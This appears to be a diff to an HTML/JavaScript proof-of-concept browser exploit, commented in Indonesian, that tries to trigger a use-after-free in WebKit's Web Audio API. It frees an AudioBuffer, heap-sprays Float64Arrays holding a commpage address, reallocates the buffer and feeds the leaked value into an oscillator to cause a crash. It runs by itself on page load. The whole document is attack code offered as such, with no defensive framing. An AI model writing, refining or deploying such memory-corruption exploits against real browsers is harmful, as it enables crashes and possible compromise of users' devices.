@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Web Audio UAF & Buffer Confusion Attack</title>
+    <title>Web Audio UAF & Buffer Confusion Attack V2 (FIXED)</title>
 </head>
 <body>
 
-    <h1>Web Audio UAF & Buffer Confusion (Commpage Target)</h1>
+    <h1>Web Audio UAF & Buffer Confusion (Commpage Target) - V2</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
     <p id="status">INIT: Siap Memuat Audio Context...</p>
     <div id="log"></div>
@@ -17,11 +17,13 @@
         const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
         
         const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
-        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n); // 0 untuk userspace
+        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n); 
 
         let audioCtx = null;
-        let victimBuffer = null; // AudioBuffer yang akan menjadi korban UAF
-        let payloadHolders = []; // Untuk menjaga agar payload tidak di-GC
+        let victimBuffer = null; 
+        let sourceNode = null; // Dibuat global agar bisa diakses
+
+        let payloadHolders = []; 
 
         function log(message) {
             document.getElementById('log').innerHTML += '<div>' + message + '</div>';
@@ -33,13 +35,11 @@
             const PAYLOAD_SIZE = 64; 
 
             for (let i = 0; i < SPRAY_COUNT; i++) {
-                // Gunakan Float64Array untuk akurasi 64-bit dan untuk menargetkan heap JIT
                 let payloadArray = new Float64Array(PAYLOAD_SIZE);
                 
-                // Isi array dengan nilai Commpage Target Address
                 payloadArray[0] = HIGH_WORD; 
                 payloadArray[1] = LOW_WORD;
-                payloadArray[2] = 9876.54; // Data pengisi
+                payloadArray[2] = 9876.54 + i; // Nilai unik per array untuk identifikasi
                 
                 payloadHolders.push(payloadArray); 
             }
@@ -49,81 +49,82 @@
         // --- FUNGSI EKSEKUSI UTAMA ---
         async function runAudioAttack() {
             try {
-                // 1. Inisialisasi Audio Context
                 audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                if (!audioCtx) {
-                    log("ERROR: Web Audio API tidak ditemukan.");
-                    return;
-                }
                 log("Phase 1: Audio Context berhasil dibuat.");
 
                 // 2. Alokasi Korban (AudioBuffer)
-                // AudioBuffer dialokasikan di memori C++ dan memiliki lifetime yang kompleks
-                victimBuffer = audioCtx.createBuffer(1, 4096, audioCtx.sampleRate); // Buffer 4096 sample
-                let sourceNode = audioCtx.createBufferSource();
+                victimBuffer = audioCtx.createBuffer(1, 4096, audioCtx.sampleRate);
+                sourceNode = audioCtx.createBufferSource();
                 sourceNode.buffer = victimBuffer;
+                
+                // KONEKSI ke destination sangat PENTING agar node aktif di C++ thread
+                sourceNode.connect(audioCtx.destination); 
+                log("Phase 2: AudioBuffer Korban dialokasikan dan dikoneksikan.");
+                
+                // 2.5 MEMULAI NODE AUDIO (PERBAIKAN LOGIKA)
+                // Memulai node audio adalah kunci untuk mengaktifkan logika C++ di WebKit
+                sourceNode.start(0); // Mulai pemrosesan audio segera
+                log("Phase 2.5: Pemrosesan Audio Dimulai (Kritis untuk Race Condition).");
 
-                log("Phase 2: AudioBuffer Korban dialokasikan.");
 
                 // 3. Menciptakan UAF (FREE)
-                // Kita secara eksplisit menghapus referensi dan memutus koneksi
-                
-                sourceNode.stop(); // Menghentikan node (mungkin memicu cleanup)
-                sourceNode.disconnect();
-                
-                // Hapus referensi agar GC bisa membersihkan AudioBuffer
-                victimBuffer = null; 
-                sourceNode = null;
-                log("Phase 3: Referensi korban dihapus (Siap di-FREE).");
-                
-                // Panggil GC secara implisit dengan alokasi cepat
-                for (let i = 0; i < 10000; i++) {
-                     let filler = new Array(Math.random() * 10 + 1);
-                }
-
-                // 4. Re-Allocate (Melakukan Spray Payload)
-                sprayPayload();
-                
-                // 5. Memicu Trigger Eksploitasi
-                log("Phase 4: Mencoba Trigger UAF Dereference...");
-                
-                // Kita akan mencoba mengalokasikan objek baru yang ukurannya sama persis
-                // dengan AudioBuffer yang baru saja di-free (Heap Grooming)
-                let attackerBuffer = audioCtx.createBuffer(1, 4096, audioCtx.sampleRate);
-                
-                // Sekarang kita mencoba membaca dari AudioBuffer yang baru, berharap ia menempati lokasi lama
-                // yang ditimpa oleh payload Commpage kita.
-                
-                let attackerView = attackerBuffer.getChannelData(0);
-                
-                try {
-                    // Akses data pada index 1, yang seharusnya kini berisi LOW_WORD (0xFFFFC320)
-                    const crashValue = attackerView[1]; 
+                // Jadwalkan penghapusan dan disconnect setelah 50ms agar C++ thread punya waktu untuk start
+                setTimeout(() => {
+                    log("Phase 3: Memicu FREE Korban (Disconnection & Penghapusan Referensi)...");
                     
-                    log(`Nilai yang dibaca dari buffer yang ditimpa: 0x${crashValue.toString(16)}`);
-                    
-                    if (crashValue === LOW_WORD) {
-                        log("SUCCESS! Nilai Commpage Address berhasil dibaca.");
+                    // Stop dan disconnect memicu cleanup di C++ thread (potensi UAF)
+                    try {
+                        sourceNode.stop(); 
+                    } catch (e) { 
+                        // Abaikan jika stop gagal karena timing audio
                     }
+                    sourceNode.disconnect();
                     
-                    // Trigger final crash: gunakan nilai yang dibaca sebagai pointer C++
-                    let crashNode = audioCtx.createOscillator();
-                    // Kita coba set properti yang akan membaca dari pointer yang ditimpa
-                    crashNode.frequency.value = crashValue; // Mencoba menggunakan Commpage Address sebagai frekuensi
+                    // Hapus semua referensi agar GC bisa membersihkan
+                    victimBuffer = null; 
+                    sourceNode = null;
+                    
+                    // Panggil Heap Spray segera setelah FREE
+                    sprayPayload(); 
 
-                } catch(e) {
-                    log("JS Error: " + e.message + " - Menunggu Segfault OS.");
-                }
+                    // 4. Memicu Trigger Eksploitasi
+                    setTimeout(() => {
+                        log("Phase 4: Mencoba Trigger UAF Dereference...");
 
+                        // Coba alokasikan AudioBuffer baru, berharap ia menempati lokasi lama
+                        let attackerBuffer = audioCtx.createBuffer(1, 4096, audioCtx.sampleRate);
+                        let attackerView = attackerBuffer.getChannelData(0);
+                        
+                        try {
+                            // Akses data 32-bit di index 1, yang seharusnya berisi LOW_WORD (0xFFFFC320)
+                            // Catatan: Float32Array menampung float (32-bit)
+                            const crashValue = attackerView[1]; 
+                            
+                            log(`Nilai yang dibaca dari buffer yang ditimpa: 0x${crashValue.toString(16)}`);
+                            
+                            // Trigger final crash: gunakan nilai yang dibaca sebagai pointer C++
+                            let crashNode = audioCtx.createOscillator();
+                            // Menggunakan Commpage Address sebagai frekuensi yang tidak valid
+                            crashNode.frequency.value = crashValue; 
+
+                        } catch(e) {
+                            log("JS Error: " + e.message + " - Menunggu Segfault OS.");
+                        }
+
+                    }, 100); // Trigger 100ms setelah free
+                    
+                }, 50); // Free 50ms setelah start
+                
             } catch (e) {
                 log("ERROR FATAL: " + e.message);
-                document.getElementById('status').textContent = 'EKSPERIMEN GAGAL: ' + e.message;
+                document.getElementById('status').textContent = 'EKSPERIMEN GAGAL TOTAL: ' + e.message;
             }
         }
         
         document.addEventListener('DOMContentLoaded', () => {
             document.getElementById('status').textContent = 'Memulai rangkaian Web Audio UAF...';
-            setTimeout(runAudioAttack, 50);
+            // Start audio context membutuhkan user gesture di iOS, tapi kita panggil langsung
+            runAudioAttack(); 
             document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Segfault (EXC_BAD_ACCESS).';
         });
 
